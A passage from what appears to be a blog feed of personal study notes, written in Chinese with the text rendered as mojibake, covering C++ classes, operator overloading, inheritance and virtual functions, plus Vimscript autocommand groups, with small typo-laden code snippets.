m_score(score)&#123;...&#125;</code></pre><p>ä½¿ç”¨æ„é€ å‡½æ•°åˆ—è¡¨ä»…ä»…æ˜¯ä¹¦å†™æ–¹ä¾¿ã€‚</p><p>åˆå§‹åŒ–constæˆå‘˜å˜é‡çš„å”¯ä¸€æ–¹æ³•æ˜¯ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ã€‚</p><h3 id="ææ„å‡½æ•°"><a href="#ææ„å‡½æ•°" class="headerlink" title="ææ„å‡½æ•°"></a>ææ„å‡½æ•°</h3><p>destructorï¼Œä¸€ç§ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼Œ<mark>åœ¨é”€æ¯å¯¹è±¡æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚</mark></p><p>ææ„å‡½æ•°çš„åå­—æ˜¯åœ¨ç±»åå‰é¢åŠ ä¸€ä¸ª<code>~</code>ç¬¦å·ã€‚</p><p>ææ„å‡½æ•°æ²¡æœ‰å‚æ•°ï¼Œä¸èƒ½è¢«é‡è½½ï¼Œï¼Œå› æ­¤ä¸€ä¸ªç±»åªèƒ½æœ‰ä¸€ä¸ªææ„å‡½æ•°ã€‚</p><p><mark>Cä¸­çš„<code>malloc()å’Œfree()</code>ä¸C++ä¸­çš„<code>new()å’Œdelete()</code>çš„åŒºåˆ«</mark><br>ç”¨newåˆ†é…å†…å­˜æ—¶ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œç”¨deleteé‡Šæ”¾å†…å­˜æ—¶ä¼šè°ƒç”¨ææ„å‡½æ•°ã€‚</p><p>åˆ›å»ºäºå †åŒºçš„å¯¹è±¡éœ€è¦æ‰‹åŠ¨deleteï¼Œ</p><hr><p><a href="https://blog.csdn.net/love9099/article/details/43086945?utm_source=app&app_version=5.4.0">å‚è€ƒ</a></p><hr><p>ææ„å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬ä¸è‡ªå·±å†™ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼šå¹²ã€‚</p><p>å…¨å±€åŒºçš„å¯¹è±¡åœ¨ç¨‹åºä¸€å¼€å§‹åˆ›å»ºï¼Œç¨‹åºç»“æŸæ—¶æ‰ä¼šè¢«é”€æ¯ã€‚æ ˆåŒºçš„å¯¹è±¡åœ¨è°ƒç”¨å‡½æ•°æ—¶æ‰åˆ›å»ºï¼Œåœ¨å‡½æ•°ç»“æŸæ—¶é”€æ¯ï¼Œåœ¨å †ä¸­å¼€è¾Ÿç©ºé—´åˆ›å»ºçš„å¯¹è±¡å¿…é¡»æ‰‹åŠ¨deleteã€‚</p><h2 id="2-11"><a href="#2-11" class="headerlink" title="2.11"></a>2.11</h2><h3 id="C-thisæŒ‡é’ˆ"><a href="#C-thisæŒ‡é’ˆ" class="headerlink" title="C++ thisæŒ‡é’ˆ"></a>C++ thisæŒ‡é’ˆ</h3><p><code>this</code>æ˜¯C++å…³é”®å­—ï¼Œä»£è¡¨ä¸€ä¸ªconstæŒ‡é’ˆï¼ŒæŒ‡å‘å½“å‰å¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡å®ƒè®¿é—®å¯¹è±¡çš„æˆå‘˜ã€‚</p><p><code>this</code>åªèƒ½ç”¨åœ¨ç±»å†…éƒ¨ï¼Œé€šè¿‡<code>this</code>å¯ä»¥è®¿é—®ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…æ‹¬publicï¼Œprotectedï¼Œprivateã€‚</p><hr><p><a href="https://blog.csdn.net/liitdar/article/details/80654324?utm_source=app&app_version=5.4.0">å‚è€ƒ</a></p><hr><h2 id="é‡è½½è¿ç®—ç¬¦-operator"><a href="#é‡è½½è¿ç®—ç¬¦-operator" class="headerlink" title="é‡è½½è¿ç®—ç¬¦ operator"></a>é‡è½½è¿ç®—ç¬¦ operator</h2><p>å…³é”®å­—<code>operator</code>ï¼Œé‡è½½æ“ä½œç¬¦ã€‚</p><p>å’Œè¿ç®—ç¬¦å¦‚<code>=</code>ä¸€èµ·ä½¿ç”¨ã€‚</p><p>ç”¨æ¥é‡è½½ä¸€ä¸ªè¿ç®—ç¬¦ï¼Œè¿ç®—ç¬¦å°±æ˜¯&lt; , &gt;, &#x3D;, è¿™ä¸€ç±»ã€‚è®©å®ƒå¯ä»¥ä½œç”¨äºç±»ä¸Šã€‚</p><p>ä¾‹å­ï¼š</p><pre><code class="hljs">bool operator= (int value) &#123;. . .&#125;</code></pre><p>å’Œå®šä¹‰å‡½æ•°ä¸€æ ·ï¼Œå‰é¢çš„<code>bool</code>æ˜¯è¿”å›å€¼ç±»å‹ï¼Œ<code>operator=</code>ç›¸å½“äºå‡½æ•°åï¼Œ<code>(int value)</code>æ˜¯å‚æ•°åˆ—è¡¨ï¼Œ<code>&#123;...&#125;</code>æ˜¯å‡½æ•°ä¸»ä½“ã€‚è¿™ä¸ªå°±æ˜¯é‡è½½äº†ç­‰å·<code>=</code>.</p><p>ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ï¼š</p><pre><code class="hljs">#   è¿™é‡Œoperator&gt;ä¸ºæˆå‘˜å‡½æ•°ç±»æ‡’å¾—å†™äº†ã€‚bool operator&gt; (int value) &#123;if (this-&gt;own &gt; value)    return ture;else     return false;&#125;int main(void)&#123;    person p1(10);    if (person &gt; 5)        printf(â€œHe has a lot of money!â€);    .    .    .&#125;#è¿™é‡Œçš„personä¼šè‡ªåŠ¨è°ƒç”¨é‡è½½åçš„&gt;,ä¹Ÿå°±æ˜¯å‡½æ•°operator&gt;, ç„¶å5å°±æ˜¯ä¼ å…¥çš„å®å‚ã€‚</code></pre><p>ä¹Ÿå¯ä»¥æŠŠé‡è½½è¿ç®—ç¬¦å‡½æ•°å£°æ˜ä¸ºéæˆå‘˜å‡½æ•°ã€‚</p><p>C++è¦æ±‚ï¼Œâ€˜&#x3D;â€™,â€˜[]â€™,â€™()â€™,â€™-&gt;â€™è¿ç®—ç¬¦å¿…é¡»è¢«å®šä¹‰ä¸ºæˆå‘˜å‡½æ•°ã€‚</p><p>å‡ ç‚¹é™åˆ¶ï¼š</p><ul><li>å®ç°è¿ç®—ç¬¦é‡è½½æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</li><li>é‡è½½åè¿ç®—ç¬¦çš„æ“ä½œæ•°è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯ç”¨æˆ·å®šä¹‰çš„ç±»å‹ï¼›</li><li>ä¸èƒ½è¿åè¿ç®—ç¬¦åŸæ¥çš„è¯­æ³•è§„åˆ™ï¼›</li><li>ä¸èƒ½åˆ›å»ºæ–°çš„è¿ç®—ç¬¦ï¼›</li><li>æœ‰ä¸€äº›è¿ç®—ç¬¦æ˜¯ä¸èƒ½é‡è½½çš„ï¼Œå¦‚â€œsizeofâ€ï¼›</li><li>&#x3D;ã€()ã€[]ã€-&gt; æ“ä½œç¬¦åªèƒ½è¢«ç±»çš„æˆå‘˜å‡½æ•°é‡è½½ã€‚</li></ul><hr><h2 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h2><h3 id="C-ç»§æ‰¿å’Œæ´¾ç”Ÿ"><a href="#C-ç»§æ‰¿å’Œæ´¾ç”Ÿ" class="headerlink" title="C++ç»§æ‰¿å’Œæ´¾ç”Ÿ"></a>C++ç»§æ‰¿å’Œæ´¾ç”Ÿ</h3><p>ç»§æ‰¿, inheritance, å°±æ˜¯ä¸€ä¸ªç±»ä»å¦ä¸€ä¸ªç±»ä¸­è·å–æˆå‘˜å‡½æ•°å’Œæˆå‘˜å˜é‡ã€‚</p><p>æ´¾ç”Ÿ, derive, å’Œç»§æ‰¿æ˜¯ä¸€ä¸ªæ¦‚å¿µã€‚</p><p>çˆ¶ç±»å’Œå­ç±»ä¸€èˆ¬æ­é…ç§°å‘¼ã€‚</p><p>åŸºç±»å’Œæ´¾ç”Ÿç±»ä¸€èˆ¬æ­é…ç§°å‘¼ã€‚</p><p>æ´¾ç”Ÿç±»å¯ä»¥å®šä¹‰è‡ªå·±çš„æ–°æˆå‘˜ã€‚</p><p>è¯­æ³•æ ¼å¼ï¼š</p><pre><code class="hljs">class Student: public People &#123;. . .&#125;</code></pre><h4 id="ä¸‰ç§ç»§æ‰¿æ–¹å¼"><a href="#ä¸‰ç§ç»§æ‰¿æ–¹å¼" class="headerlink" title="ä¸‰ç§ç»§æ‰¿æ–¹å¼"></a>ä¸‰ç§ç»§æ‰¿æ–¹å¼</h4><p>æœ‰ä¸‰ç§ç»§æ‰¿æ–¹å¼ï¼Œpublicï¼Œprivateï¼Œprotectedï¼Œé»˜è®¤ä¸ºprivateã€‚</p><p>ç±»æˆå‘˜è®¿é—®æƒé™çš„é«˜ä½ï¼š<br>public &amp;rarr; protected &amp;rarr; private</p><p>protectedçš„å˜é‡å¯ä»¥åœ¨æ´¾ç”Ÿç±»ä¸­ä½¿ç”¨ã€‚</p><p>ç»§æ‰¿æ–¹å¼ä¸­çš„publicï¼Œprotectedï¼Œprivateæ˜¯æŒ‡æ˜åŸºç±»æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­çš„<mark>æœ€é«˜è®¿é—®æƒé™</mark>ã€‚</p><p><mark>protected</mark>çš„æˆå‘˜ä¹Ÿä¸èƒ½é€šè¿‡å¯¹è±¡è®¿é—®ã€‚</p><p>å®é™…å¼€å‘ä¸­ä¸€èˆ¬ä½¿ç”¨<code>public</code></p><p>åœ¨æ´¾ç”Ÿä¸­è®¿é—®åŸºç±»çš„privateæˆå‘˜çš„å”¯ä¸€æ–¹æ³•å°±æ˜¯å€ŸåŠ©åŸºç±»çš„éprivateçš„æˆå‘˜å‡½æ•°ã€‚</p><h4 id="æ”¹å˜æƒé™"><a href="#æ”¹å˜æƒé™" class="headerlink" title="æ”¹å˜æƒé™"></a>æ”¹å˜æƒé™</h4><p>å¯ä»¥ä½¿ç”¨<code>using</code>æ”¹å˜æƒé™ã€‚</p><h3 id="C-ç»§æ‰¿æ—¶åå­—é®è”½é—®é¢˜"><a href="#C-ç»§æ‰¿æ—¶åå­—é®è”½é—®é¢˜" class="headerlink" title="C++ç»§æ‰¿æ—¶åå­—é®è”½é—®é¢˜"></a>C++ç»§æ‰¿æ—¶åå­—é®è”½é—®é¢˜</h3><p>å¦‚æœæ´¾ç”Ÿç±»ä¸­çš„æˆå‘˜å’ŒåŸºç±»ä¸­çš„æˆå‘˜é‡åï¼Œé‚£ä¹ˆå°±ä¼šé®è”½ä»åŸºç±»ç»§æ‰¿è¿‡æ¥çš„æˆå‘˜ã€‚</p><p>æ­¤æ—¶è®¿é—®åŸºç±»çš„æˆå‘˜å°±è¦ä½¿ç”¨ç±»åå’ŒåŸŸè§£æç¬¦<code>::</code>ã€‚</p><p>åŸºç±»æˆå‘˜å‡½æ•°å’Œæ´¾ç”Ÿç±»æˆå‘˜å‡½æ•°ä¸æ„æˆ<mark>é‡è½½</mark>.</p><h2 id="5-1"><a href="#5-1" class="headerlink" title="5.1"></a>5.1</h2><h3 id="C-å¤šæ€å’Œè™šå‡½æ•°"><a href="#C-å¤šæ€å’Œè™šå‡½æ•°" class="headerlink" title="C++å¤šæ€å’Œè™šå‡½æ•°"></a>C++å¤šæ€å’Œè™šå‡½æ•°</h3><p>åŸºç±»çš„æŒ‡é’ˆåªèƒ½ç”¨æ¥è®¿é—®æ´¾ç”Ÿç±»çš„æˆå‘˜å˜é‡ï¼Œä½†ä¸èƒ½è®¿é—®æ´¾ç”Ÿç±»çš„æˆå‘˜å‡½æ•°ã€‚</p><p>ä¸ºäº†è®©åŸºç±»æŒ‡é’ˆèƒ½å¤Ÿè®¿é—®æ´¾ç”Ÿç±»çš„æˆå‘˜å‡½æ•°ï¼ŒC++æ–°å¢äº†è™šå‡½æ•°ï¼Œvitual functionã€‚</p><p>å…³é”®è¯<code>virtual</code>.</p><p>æœ‰äº†è™šå‡½æ•°ä¹‹åï¼ŒåŸºç±»æŒ‡é’ˆæŒ‡å‘åŸºç±»å¯¹è±¡æ—¶å°±èƒ½ä½¿ç”¨åŸºç±»çš„æˆå‘˜ï¼ŒæŒ‡å‘æ´¾ç”Ÿç±»æ—¶å°±èƒ½å¤Ÿä½¿ç”¨æ´¾ç”Ÿç±»çš„æˆå‘˜ã€‚</p><p>æ¢å¥è¯è¯´ï¼ŒåŸºç±»æŒ‡é’ˆæ—¢èƒ½å¤ŸæŒ‰ç…§åŸºç±»çš„æ–¹å¼åšäº‹ï¼Œåˆèƒ½å¤ŸæŒ‰ç…§æ´¾ç”Ÿç±»çš„æ–¹å¼æ¥åšäº‹ï¼Œå®ƒæœ‰å¤šç§å½¢æ€ï¼Œæˆ–è€…è¯´å¤šç§è¡¨ç°æ–¹å¼ï¼Œæˆ‘ä»¬å°†è¿™ç§ç°è±¡ç§°ä¸º<mark>å¤šæ€ï¼ŒPolymorphism</mark>ã€‚</p><p>ä¹Ÿå°±æ˜¯è™šå‡½æ•°æ˜¯å®ç°å¤šæ€çš„ä¸€ç§æ–¹å¼ã€‚</p><p>å¤šæ€æ˜¯<mark>é¢å‘å¯¹è±¡ç¼–ç¨‹</mark>çš„ä¸»è¦ç‰¹å¾ä¹‹ä¸€.</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Essential C++ Notes</title>
    <link href="/2022/08/25/Essential%20C++%20Notes/"/>
    <url>/2022/08/25/Essential%20C++%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-x2F-5-x2F-28"><a href="#2022-x2F-5-x2F-28" class="headerlink" title="2022&#x2F;5&#x2F;28"></a>2022&#x2F;5&#x2F;28</h1><h2 id="ç¬¬ä¸€ç« "><a href="#ç¬¬ä¸€ç« " class="headerlink" title="ç¬¬ä¸€ç« "></a>ç¬¬ä¸€ç« </h2><h3 id="p1-p34"><a href="#p1-p34" class="headerlink" title="p1~p34"></a>p1~p34</h3><p>å¸ƒå°”å€¼(Boolean).</p><p><mark>å‘½åç©ºé—´</mark><br>æ˜¯ä¸€ç§å°†åº“åç§°å°è£…èµ·æ¥çš„æ–¹æ³•ã€‚</p><p>ä¸ºä»€ä¹ˆ<code>string class</code>é‡‡ç”¨erase()è€Œédelete()æ¥è¡¨ç¤ºâ€œåˆ å»ä¸€ä¸ªå­—ç¬¦â€çš„åŸå› ã€‚æ˜¯å› ä¸ºdeleteæ˜¯å¸¸ç”¨è¯­è¨€ã€‚</p><h4 id="å¦å¤–ä¸€ç§ä¸åŒçš„åˆå§‹åŒ–è¯­æ³•"><a href="#å¦å¤–ä¸€ç§ä¸åŒçš„åˆå§‹åŒ–è¯­æ³•" class="headerlink" title="å¦å¤–ä¸€ç§ä¸åŒçš„åˆå§‹åŒ–è¯­æ³•"></a>å¦å¤–ä¸€ç§ä¸åŒçš„åˆå§‹åŒ–è¯­æ³•</h4><p>æ„é€ å‡½æ•°è¯­æ³•(constructor syntax):</p><pre><code class="hljs">int num_tries(0);</code></pre><p>å…¶ç›®çš„æ˜¯å¤„ç†éœ€è¦å¤šå€¼åˆå§‹åŒ–çš„å¯¹è±¡ã€‚</p><h4 id="arrayå’Œvector"><a href="#arrayå’Œvector" class="headerlink" title="arrayå’Œvector"></a>arrayå’Œvector</h4><p>arrayçš„å¤§å°å¿…é¡»æ˜¯å¸¸å€¼è¡¨è¾¾å¼ï¼Œå³ä¸éœ€è¦åœ¨è¿è¡Œæ—¶æ±‚å€¼çš„è¡¨è¾¾å¼ã€‚</p><p>a+bè¿™ç§ç®—æ±‚å€¼ï¼Œè€Œaä¸ç®—ã€‚</p><p>arrayæ˜¯å†…ç½®çš„ï¼Œä¸éœ€è¦åŒ…å«å¤´æ–‡ä»¶ï¼Œä½¿ç”¨vectorè¦åŒ…å«<code>#include &lt;vector.h&gt;</code>å¤´æ–‡ä»¶ã€‚</p><hr><h4 id="tamplate-classå’Œclass-tamplate"><a href="#tamplate-classå’Œclass-tamplate" class="headerlink" title="tamplate classå’Œclass tamplate"></a>tamplate classå’Œclass tamplate</h4><pre><code class="hljs">tamplate &lt;typename A&gt;   #æŠŠAå˜ä¸ºæ¨¡ç‰ˆ</code></pre><p>Aå¯ä»¥ä¸ºä»»æ„ç±»å‹ã€‚ä½ ç”¨intï¼ŒAæ•‘ä¼šå˜æˆintã€‚</p><hr><p>vectorä¸æ”¯æŒåˆå§‹åŒ–åˆ—è¡¨çš„æ–¹å¼ã€‚</p><p>vectorçŸ¥é“è‡ªå·±çš„å¤§å°ã€‚</p><pre><code class="hljs">cout &lt;&lt; elem_seq.size()</code></pre><p>åœ¨ä½¿ç”¨æŒ‡é’ˆæ—¶ï¼Œå¿…é¡»å…ˆç¡®å®šå®ƒçš„ç¡®åªæƒ³æŸä¸ªå¯¹è±¡ã€‚</p><p>æ£€éªŒæŒ‡é’ˆæ˜¯å¦ä½nullï¼š</p><pre><code class="hljs">if (!pi)</code></pre><p>ä»»ä½•æŒ‡é’ˆéƒ½å¯ä»¥è¢«åˆå§‹åŒ–ä¸ºé›¶ã€‚</p><p>rand()å’Œsrand()å‡½æ•°ä½äºcstdlibå¤´æ–‡ä»¶ä¸­ã€‚</p><p><code>.</code>dotï¼Œæˆå‘˜é€‰æ‹©ç¬¦å’Œ <code>-&gt;</code>arrowï¼Œæˆå‘˜é€‰æ‹©ç¬¦</p><p>Standard Template Library, STL.</p><h4 id="æ–‡ä»¶çš„è¯»å†™"><a href="#æ–‡ä»¶çš„è¯»å†™" class="headerlink" title="æ–‡ä»¶çš„è¯»å†™"></a>æ–‡ä»¶çš„è¯»å†™</h4><p>fstreamå¤´æ–‡ä»¶ã€‚</p><p>æ‰“å¼€å¯ä¾›è¾“å‡ºçš„æ–‡ä»¶ï¼Œå®šä¹‰ä¸€ä¸ªofstreamå¯¹è±¡ã€‚</p><p>æ‰“å¼€æ–‡ä»¶åå’Œæ‰“å¼€æ¨¡å¼ã€‚</p><p><mark>cerrå’Œcoutçš„åŒºåˆ«</mark><br>cerræ— ç¼“å†²ã€‚</p><p><mark>endlæ“ä½œç¬¦</mark><br>æ’å…¥ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œæ¸…é™¤è¾“å‡ºç¼“å†²åŒºã€‚</p><p>æ‰“å¼€ä¸€ä¸ªè¯»æ–‡ä»¶ï¼Œå®šä¹‰ifstreamå¯¹è±¡ã€‚</p><p>åŒæ—¶è¯»å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œå®šä¹‰ä¸€ä¸ªfstreamæ–‡ä»¶ï¼Œå¹¶ä¼ å…¥<code>ios_base::in|ios_base::app</code>å‚æ•°ã€‚</p><p><mark>C++å¤´æ–‡ä»¶</mark><br>ä½¿ç”¨<code>#include</code>æ—¶æ²¡æœ‰<code>.h</code>åç¼€ã€‚</p><p>æ‰“å¼€æ–‡ä»¶æ—¶æ³¨æ„æ£€æŸ¥æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚</p><h2 id="ç¬¬äºŒç« "><a href="#ç¬¬äºŒç« " class="headerlink" title="ç¬¬äºŒç« "></a>ç¬¬äºŒç« </h2><h3 id="p35ï½"><a href="#p35ï½" class="headerlink" title="p35ï½"></a>p35ï½</h3><p>ä½¿ç”¨<code>cstdlib</code>ä¸­çš„<code>exit()</code>å‡½æ•°ç»ˆæ­¢ç¨‹åºã€‚</p><h4 id="å¼•ç”¨å’ŒæŒ‡é’ˆçš„åŒºåˆ«"><a href="#å¼•ç”¨å’ŒæŒ‡é’ˆçš„åŒºåˆ«" class="headerlink" title="å¼•ç”¨å’ŒæŒ‡é’ˆçš„åŒºåˆ«"></a>å¼•ç”¨å’ŒæŒ‡é’ˆçš„åŒºåˆ«</h4><p><mark>å¼•ç”¨çš„æœ¬è´¨</mark><br>å°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆå¸¸é‡ã€‚æŒ‡å‘ä¸å¯ä»¥æ”¹åŠ¨ï¼Œä½†æŒ‡å‘çš„å€¼å¯ä»¥æ”¹åŠ¨ã€‚</p><hr><p>éšå¼é€€å‡ºç‚¹ï¼Œæ²¡æœ‰<code>return</code>è¯­å¥æ—¶ï¼Œä½äºæœ€åä¸€æ¡è¯­å¥ä¹‹åã€‚</p><h4 id="åŠ¨æ€å†…å­˜ç®¡ç†"><a href="#åŠ¨æ€å†…å­˜ç®¡ç†" class="headerlink" title="åŠ¨æ€å†…å­˜ç®¡ç†"></a>åŠ¨æ€å†…å­˜ç®¡ç†</h4><p>åˆ†é…ç”¨<code>new</code>é‡Šæ”¾ç”¨<code>delete</code></p><pre><code class="hljs">new Type(initial_value);int *pi;pi = new int;delete pi;</code></pre><p>C++æ²¡æœ‰æä¾›ä»»ä½•è¯­æ³•è®©æˆ‘ä»¬å¾—ä»¥ä»heapåˆ†é…æ•°ç»„çš„åŒæ—¶ä¸ºå…¶å…ƒç´ è®¾å®šåˆå€¼ã€‚</p><p>é‡Šæ”¾æ•°ç»„æœ‰æ‰€ä¸åŒ:</p><pre><code class="hljs">delete [] pia;</code></pre><h4 id="æä¾›é»˜è®¤å‚æ•°å€¼"><a href="#æä¾›é»˜è®¤å‚æ•°å€¼" class="headerlink" title="æä¾›é»˜è®¤å‚æ•°å€¼"></a>æä¾›é»˜è®¤å‚æ•°å€¼</h4><p>C++å…è®¸æˆ‘ä»¬ä¸ºå…¨éƒ¨æˆ–éƒ¨åˆ†å‚æ•°è®¾å®šé»˜è®¤å€¼ã€‚å¦‚ï¼š</p><pre><code class="hljs">void display(ostream &amp;os = cout)</code></pre><p><mark>coutå’Œcin</mark>éƒ½æ˜¯æ–‡ä»¶ã€‚</p><p>æœ‰ä¸¤ä¸ªè§„åˆ™ï¼š</p><ol><li>é»˜è®¤å€¼çš„è§£ææ˜¯ä»å³ä¾§å¼€å§‹çš„ï¼Œå¦‚æœæˆ‘ä»¬ä¸ºæŸä¸ªå‚æ•°æä¾›äº†é»˜è®¤å€¼ï¼Œé‚£ä¹ˆè¿™ä¸€å‚æ•°å³ä¾§çš„æ‰€æœ‰å‚æ•°éƒ½å¿…é¡»ä¹Ÿå…·æœ‰é»˜è®¤å€¼ã€‚</li><li>é»˜è®¤å€¼åªèƒ½æŒ‡å®šä¸€æ¬¡ï¼Œåœ¨å£°æ˜å¤„æˆ–å®šä¹‰å¤„ã€‚å¸¸æ”¾åœ¨å£°æ˜å¤„ã€‚</li></ol><h4 id="å±€éƒ¨é™æ€å¯¹è±¡"><a href="#å±€éƒ¨é™æ€å¯¹è±¡" class="headerlink" title="å±€éƒ¨é™æ€å¯¹è±¡"></a>å±€éƒ¨é™æ€å¯¹è±¡</h4><p>ä½¿ç”¨<code>static</code>å…³é”®è¯ã€‚</p><p><code>push_back</code>ä¼šæŠŠæ•°å€¼æ”¾åœ¨vectoræœ«ç«¯ã€‚</p><h4 id="å£°æ˜inlineå‡½æ•°"><a href="#å£°æ˜inlineå‡½æ•°" class="headerlink" title="å£°æ˜inlineå‡½æ•°"></a>å£°æ˜inlineå‡½æ•°</h4><p>å°†å‡½æ•°å£°æ˜ä¸º<code>inline</code>ï¼Œè¡¨ç¤ºè¦æ±‚ç¼–è¯‘å™¨åœ¨æ¯ä¸ªå‡½æ•°çš„è°ƒç”¨ç‚¹ä¸Šï¼Œå°†å‡½æ•°çš„å†…å®¹å±•å¼€ã€‚<br>å¦‚ï¼š</p><pre><code class="hljs">inline bool fibon_elem(int pos, int &amp;elem)&#123;...&#125;</code></pre><p><code>inline</code>åªæ˜¯ä¸€ç§è¯·æ±‚ã€‚</p><p>ä¸€èˆ¬ï¼Œä½“ç§¯å°ï¼Œå¸¸è°ƒç”¨çš„å‡½æ•°è¢«å£°æ˜ä¸º<code>inline</code>.</p><h4 id="æä¾›é‡è½½å‡½æ•°"><a href="#æä¾›é‡è½½å‡½æ•°" class="headerlink" title="æä¾›é‡è½½å‡½æ•°"></a>æä¾›é‡è½½å‡½æ•°</h4><p>å‡½æ•°é‡è½½æœºåˆ¶(function overloading)<br>å‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¸åŒï¼Œå¯ä»¥æœ‰ç›¸åŒçš„åç§°ã€‚ä½†æ— æ³•æ ¹æ®è¿”å›å€¼åˆ¤æ–­ã€‚</p><p>å‡½æ•°æ¨¡ç‰ˆæœºåˆ¶(function tamplate)</p><pre><code class="hljs">template &lt;typename elemType&gt;Void display_message(const string &amp;msg, const vector&lt;elemType&gt; &amp;It);</code></pre><h4 id="å‡½æ•°æŒ‡é’ˆ"><a href="#å‡½æ•°æŒ‡é’ˆ" class="headerlink" title="å‡½æ•°æŒ‡é’ˆ"></a>å‡½æ•°æŒ‡é’ˆ</h4><p>pointer to function,<br>å¦‚ï¼š</p><pre><code class="hljs">const vector&lt;int&gt;* (*seq_ptr)(int);</code></pre><p>å‡½æ•°çš„åç§°å°±æ˜¯å‡½æ•°çš„åœ°å€ã€‚</p><h4 id="æšä¸¾ç±»å‹"><a href="#æšä¸¾ç±»å‹" class="headerlink" title="æšä¸¾ç±»å‹"></a>æšä¸¾ç±»å‹</h4><p>enumerate typeï¼Œ<code>enum</code>å…³é”®å­—ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œç¬¬ä¸€ä¸ªæšä¸¾å€¼ä¸º0ï¼Œæ¥ä¸‹æ¥ä¸º1ï¼Œä»¥æ­¤ç±»æ¨ã€‚<br>å¦‚ï¼š</p><pre><code class="hljs">enum color&#123;red, blue, greenYellow, grey&#125;;  #redå€¼ä¸º1</code></pre><p>å¯ç”¨æšä¸¾ç±»å‹ä½œä¸ºç´¢å¼•å€¼ã€‚</p><h4 id="è®¾å®šå¤´æ–‡ä»¶"><a href="#è®¾å®šå¤´æ–‡ä»¶" class="headerlink" title="è®¾å®šå¤´æ–‡ä»¶"></a>è®¾å®šå¤´æ–‡ä»¶</h4><p>å¤´æ–‡ä»¶ä¸€èˆ¬ä¸åŒ…å«å‡½æ•°çš„å®šä¹‰ï¼Œinclineå‡½æ•°é™¤å¤–ã€‚</p><p>ä¸ºäº†æ‰©å±•inclineå‡½æ•°ï¼Œç¼–è¯‘å™¨åœ¨æ¯ä¸ªè°ƒç”¨ç‚¹ä¸Šï¼Œéƒ½è¦å–å…¶å®šä¹‰ã€‚</p><p><code>extern</code></p><h4 id="æ³›å‹ç¼–ç¨‹é£æ ¼"><a href="#æ³›å‹ç¼–ç¨‹é£æ ¼" class="headerlink" title="æ³›å‹ç¼–ç¨‹é£æ ¼"></a>æ³›å‹ç¼–ç¨‹é£æ ¼</h4>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn Vimscript the Hard Way Notes</title>
    <link href="/2022/08/25/Learn%20Vimscript%20the%20Hard%20Way%20Notes/"/>
    <url>/2022/08/25/Learn%20Vimscript%20the%20Hard%20Way%20Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://learnvimscriptthehardway.stevelosh.com/">learn vimscrip the hard way</a></p><hr><h1 id="ç¬¬äºŒæ¬¡é˜…è¯»"><a href="#ç¬¬äºŒæ¬¡é˜…è¯»" class="headerlink" title="ç¬¬äºŒæ¬¡é˜…è¯»"></a>ç¬¬äºŒæ¬¡é˜…è¯»</h1><h2 id="14-Autocommand-Groups"><a href="#14-Autocommand-Groups" class="headerlink" title="14 Autocommand Groups"></a>14 Autocommand Groups</h2><p>éœ€è¦ç”¨ <code>augroup</code> åŒ…è£¹. å¯¹åŒä¸€ä¸ªç»„å¤šæ¬¡ä½¿ç”¨ <code>augroup</code> å…¶ä¼šå åŠ .</p><p>ç”¨ <code>augroup</code> å¯èƒ½æ˜¯æ–¹ä¾¿ç»„ç»‡.<br>å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> testgroup<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;cat&quot;</span><br><span class="hljs-keyword">augroup</span> END<br><br><span class="hljs-keyword">augroup</span> testgroup<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;dog&quot;</span><br><span class="hljs-keyword">augroup</span> END<br></code></pre></td></tr></table></figure><p>è¦æƒ³é‡å†™åˆ™ä½¿ç”¨ <code>autocmd!</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> testgroup<br>    autocmd!<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;dog&quot;</span><br><span class="hljs-keyword">augroup</span> END<br></code></pre></td></tr></table></figure><p>é’ˆå¯¹æŸç§æ–‡ä»¶:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> filetype_html<br>    autocmd!<br>    <span class="hljs-keyword">autocmd</span> FileType html <span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;buffer&gt;</span> <span class="hljs-symbol">&lt;localleader&gt;</span><span class="hljs-keyword">f</span> Vatzf<br></code></pre></td></tr></table></figure><h2 id="40-Paths"><a 